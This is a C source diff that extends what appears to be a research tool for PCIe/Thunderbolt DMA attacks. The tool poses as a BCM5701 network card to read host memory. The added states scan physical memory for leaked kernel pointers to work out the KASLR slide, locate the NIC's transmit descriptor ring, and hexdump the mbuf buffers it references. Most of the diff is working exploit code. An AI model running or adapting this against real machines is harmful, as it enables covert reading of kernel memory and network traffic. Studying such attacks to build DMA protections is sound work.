@@ -158,17 +158,26 @@ read_page(uint64_t address, uint32_t devfn, uint8_t* buffer)
 }
 
 void
-print_page(uint8_t* page_data)
+hexdump(uint8_t* data, uint64_t length)
 {
 	const uint64_t BYTES_PER_LINE = 16;
-	uint64_t offset = 0;
-	while (offset < 4096) {
+	uint64_t char_offset, offset = 0;
+	while (offset < length) {
 		if (offset % BYTES_PER_LINE == 0) {
 			printf("%04lx  ", offset);
 		}
-		printf("%02x", page_data[offset]);
+		printf("%02x", data[offset]);
 		++offset;
 		if (offset % BYTES_PER_LINE == 0) {
+			putchar(' ');
+			for (char_offset = offset - BYTES_PER_LINE; char_offset < offset;
+				++char_offset) {
+				if (data[char_offset] >= 0x20 && data[char_offset] <= 126) {
+					putchar(data[char_offset]);
+				} else {
+					putchar(' ');
+				}
+			}
 			putchar('\n');
 		} else {
 			putchar(' ');
@@ -190,7 +199,7 @@ print_page_at_address(uint64_t address, uint32_t devfn)
 	}
 
 	printf("0x%lx\n", get_page_address(address));
-	print_page(page_data);
+	hexdump(page_data, 4096);
 
 	return read_result;
 }
@@ -198,11 +207,13 @@ print_page_at_address(uint64_t address, uint32_t devfn)
 enum attack_state {
 	AS_UNINITIALISED,
 	AS_PROBING_NIC,
-	/* This doesn't work from Thunderbolt. The brdge itself seems to drop the
+	/* The above doesn't work from Thunderbolt. The brdge itself seems to drop the
 	 * config requests. XXX: Would be interesting to try on FreeBSD
 	 * internally.
 	 */
-	AS_LOOKING_FOR_DESCRIPTOR_RING
+	AS_LOOKING_FOR_LEAKED_SYMBOL,
+	AS_LOOKING_FOR_DESCRIPTOR_RING,
+	AS_FINDING_MBUF_PAGE
 };
 
 enum packet_response {
@@ -285,7 +296,7 @@ respond_to_packet(struct packet_response_state *state,
 int
 main(int argc, char *argv[])
 {
-	int send_result;
+	int i, send_result, read_result;
 	TLPQuadWord tlp_in_quadword[32];
 	TLPQuadWord tlp_out_header[2];
 	TLPQuadWord tlp_out_data[16];
@@ -297,14 +308,16 @@ main(int argc, char *argv[])
 	enum packet_response response;
 	struct packet_response_state packet_response_state;
 	packet_response_state.attack_state = AS_UNINITIALISED;
-	int read_result;
-	/*uint64_t next_read_addr = 0x400000;*/
-	uint64_t read_addr, next_read_addr = 0x00000;
-	struct bcm5701_send_buffer_descriptor descriptors[16];
+	uint64_t read_addr, next_read_addr = 0x400000;
 	/*
 	 * We have found that in practise the tx ring is not located lower
 	 * than this.
 	 */
+	struct bcm5701_send_buffer_descriptor descriptors[16];
+	uint64_t candidate_symbols[32];
+	uint8_t mbuf[256];
+
+	uint64_t host_address_to_probe, aligned_ha, shifted_ha;
 
 	int init = pcie_hardware_init(argc, argv, &physmem);
 	if (init) {
@@ -343,6 +356,39 @@ main(int argc, char *argv[])
 			send_result = send_tlp(&raw_tlp_out);
 			printf("NIC probe result: %d.\n", send_result);
 			break;
+		case AS_LOOKING_FOR_LEAKED_SYMBOL:
+			if ((next_read_addr & 0xFFFFF) == 0) {
+				putchar('.');
+				fflush(NULL);
+			}
+			read_result = perform_dma_read((uint8_t *)candidate_symbols,
+				256, packet_response_state.devfn, 0, next_read_addr);
+			read_addr = next_read_addr;
+			if (read_result == -1) {
+				next_read_addr += 4096;
+				continue;
+			} else {
+				next_read_addr += 256;
+			}
+
+			for (i = 0; i < 32; ++i) {
+				candidate_symbols[i] = bswap64(candidate_symbols[i]);
+				/*if ((candidate_symbols[i] & 0xfffff) == 0x283c0) {*/
+					/*printf("\nFound slid gIOBMDAllocator.\n");*/
+					/*printf("At address 0x%lx.\n", read_addr);*/
+					/*printf("Slid address: 0x%lx.\n", candidate_symbols[i]);*/
+					/*printf("Slide: 0x%lx.\n", candidate_symbols[i] -*/
+						/*0xffffff8000b283c0l);*/
+				/*}*/
+				if ((candidate_symbols[i] & 0xFFFFFFFFFF000000) ==
+					0xFFFFFF8000000000) {
+					printf("\nFound symbol.\n");
+					printf("At address 0x%lx.\n", read_addr +
+						i * sizeof(uint64_t));
+					printf("Address: 0x%lx.\n", candidate_symbols[i]);
+				}
+			}
+			break;
 		case AS_LOOKING_FOR_DESCRIPTOR_RING:
 			read_result = perform_dma_read((uint8_t *)descriptors,
 				256, packet_response_state.devfn, 0, next_read_addr);
@@ -352,23 +398,41 @@ main(int argc, char *argv[])
 				continue;
 			}
 			endianess_swap_descriptors(descriptors, 16);
-			/*if (!is_probably_descriptor(&(descriptors[0]))) {*/
-			if (!is_brett_descriptor(&(descriptors[0]))) {
+			if (!is_probably_descriptor(&(descriptors[0]))) {
+			/*if (!is_brett_descriptor(&(descriptors[0]))) {*/
 				continue;
 			}
 			printf("Probably a descriptor at 0x%lx OK.\n", read_addr);
-			print_descriptors(descriptors, 16);
-			/*print_page_at_address(descriptors[0].host_address,*/
-				/*packet_response_state.devfn);*/
+			print_descriptors(descriptors, 1);
 			printf("host_address >> 32 = 0x%lx.\n",
 				descriptors[0].host_address >> 32);
-			/*print_page_at_address(descriptors[0].host_address >> 32,*/
-				/*packet_response_state.devfn);*/
 			printf("host_address with mask = 0x%lx.\n",
 				descriptors[0].host_address & uint64_mask(32));
-			/*print_page_at_address(descriptors[0].host_address & uint64_mask(32),*/
-				/*packet_response_state.devfn);*/
+			packet_response_state.attack_state = AS_FINDING_MBUF_PAGE;
+			host_address_to_probe = descriptors[0].host_address;
+
 			break;
+		case AS_FINDING_MBUF_PAGE:
+			aligned_ha = host_address_to_probe & ~0xFFl;
+			printf("Reading address 0x%lx.\n", aligned_ha);
+			read_result = perform_dma_read(mbuf, 256,
+				packet_response_state.devfn, 0, aligned_ha);
+			if (read_result == -1) {
+				printf("Read failed. :(\n");
+			} else {
+				hexdump(mbuf, 256);
+			}
+			shifted_ha = (host_address_to_probe >> 32) & ~0xFFl;
+			printf("Reading address 0x%lx.\n", shifted_ha);
+			read_result = perform_dma_read(mbuf, 256,
+				packet_response_state.devfn, 0, shifted_ha);
+			if (read_result == -1) {
+				printf("Read failed. :(\n");
+			} else {
+				hexdump(mbuf, 256);
+			}
+
+			packet_response_state.attack_state = AS_LOOKING_FOR_DESCRIPTOR_RING;
 		}
 	}
 	
